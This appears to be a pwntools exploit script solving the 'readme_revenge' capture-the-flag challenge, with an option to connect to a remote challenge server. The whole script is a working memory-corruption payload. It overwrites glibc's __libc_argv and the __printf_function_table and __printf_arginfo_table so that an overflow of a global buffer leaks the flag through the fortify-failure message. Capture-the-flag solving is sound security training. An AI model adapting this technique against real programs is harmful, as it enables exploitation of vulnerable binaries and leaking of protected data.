from pwn import *
import sys

target = "./readme_revenge"
binary = ELF(target)

if len(sys.argv) == 1:
	r = process(target)
else:
	r = remote("35.198.130.245", 1337)

raw_input()

flag = binary.symbols['flag']
name = binary.symbols['name']
libc_argv = binary.symbols['__libc_argv']
func_table = binary.symbols['__printf_function_table']
arg_table = binary.symbols['__printf_arginfo_table']
log.info("flag                    : 0x%x" % flag)
log.info("name                    : 0x%x" % name)
log.info("__libc_argv             : 0x%x" % libc_argv)
log.info("__printf_function_table : 0x%x" % func_table)
log.info("__printf_arginfo_table  : 0x%x" % arg_table)

payload = p64(flag)
payload += "\x00" * 912
payload += p64(binary.symbols['__fortify_fail'])
payload += "a" * (libc_argv - name - len(payload))
payload += p64(name)
payload += "a" * (func_table - libc_argv - 8)
payload += p64(1)
payload += "\x00" * (arg_table - func_table - 8)
payload += p64(name)
r.sendline(payload)


r.interactive()
